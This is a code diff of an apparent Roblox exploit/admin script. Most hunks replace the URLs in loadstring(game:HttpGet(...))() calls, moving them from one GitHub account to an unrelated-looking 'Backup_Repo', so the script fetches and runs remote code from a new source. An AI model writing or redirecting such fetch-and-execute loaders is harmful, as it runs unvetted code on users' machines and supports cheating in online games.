@@ -4569,7 +4569,7 @@ if game.PlaceId ~= 13967668166 and game.PlaceId ~= 99644611200703 and game.Place
 end
 
 -- [[ configuration GUI. ]] --
-if not CoreGui:FindFirstChild("FlamesAdminGUI", true) then loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/RushTeam/refs/heads/main/configuration.lua"))() end
+if not CoreGui:FindFirstChild("FlamesAdminGUI", true) then loadstring(game:HttpGet("https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/Configuration_GUI.lua"))() end
 --local base_url_API = tostring("https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/billboard_main_framework.lua")
 local config_path = "Flames_Admin_Config.json"
 --loadstring(game:HttpGet(base_url_API))()
@@ -5258,7 +5258,7 @@ Lib.connect("bad_accessories_player_removing", Players.PlayerRemoving:Connect(fu
 end))
 
 if not g.Loaded_Actual_Chat_Actors_Global_Setter then
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/FlamesHub_OldAPI_Runtime_Functions/refs/heads/main/chat_handler_exclusive.lua'))()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/chat_handler_exclusive.lua'))()
    g.Loaded_Actual_Chat_Actors_Global_Setter = true
 end
 
@@ -7434,7 +7434,7 @@ g.workspace_editor_script_GUI = function()
       return 
    end
    fw(0.1)
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/Workspace_Editor.lua'))()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/Workspace_Editor.lua'))()
 end
 
 local chats = {
@@ -10046,7 +10046,7 @@ g.streamer_mode_script = function()
       return notify("Warning", "Streamer Mode script is already loaded.", 5)
    end
 
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/Streamer_Mode.lua"))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/Streamer_Mode.lua"))()
 end
 
 g.unload_streamer_mode_script = function()
@@ -10651,7 +10651,7 @@ g.save_copied_plrs_emote = function()
       end
 
       g.FreeEmotes_Enabled = true
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/flames_emotes_gui_new.lua"))()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/Emotes_Backup.lua"))()
       wait(1)
       g.notify("Info", "Try the command again, you did not have our Free Emotes GUI loaded.", 15)
       wait(1)
@@ -14821,7 +14821,7 @@ g.infinite_premium = g.infinite_premium or function()
       return notify("Warning", "You already have Infinite Yield running! You cannot and should NOT run both at the same time.", 10)
    end
 
-   loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/crazyDawg/refs/heads/main/InfYieldOther.lua'))()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/Infinite_Premium.lua'))()
 end
 
 g.infinite_yield = g.infinite_yield or function()
@@ -14944,7 +14944,6 @@ g.send_msg_menu = g.send_msg_menu or function()
    layout.VerticalAlignment = Enum.VerticalAlignment.Top
 
    local selected = nil
-
    local function refresh()
       for _,v in ipairs(playerscroll:GetChildren()) do
          if v:IsA("TextButton") then v:Destroy() end
@@ -15094,7 +15093,7 @@ g.lock_vehicle = g.lock_vehicle or function(Vehicle)
 end
 
 if not g.HasSeen_Loading_Screen then
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/startIntroFadeScreen"))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/Intro_Screen.lua"))()
    g.HasSeen_Loading_Screen = true
 end
 
@@ -18686,7 +18685,7 @@ local function print_bytes(label, s)
    print(label .. ": " .. table.concat(bytes, ","))
 end
 local function clean(s) return s:gsub("[%c%z%s]", ""):gsub("[^\32-\126]", "") end
-local script_url = "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogether_RP_Admin.lua" -- or what ever you want it to be.
+local script_url = "https://raw.githubusercontent.com/dudeididntliterally/Backup_Repo/refs/heads/main/Life_Together_Admin.lua" -- or what ever you want it to be.
 local function ws_get_version()
    if not g.ws_main_reactor_connector then return nil end
    local result = nil
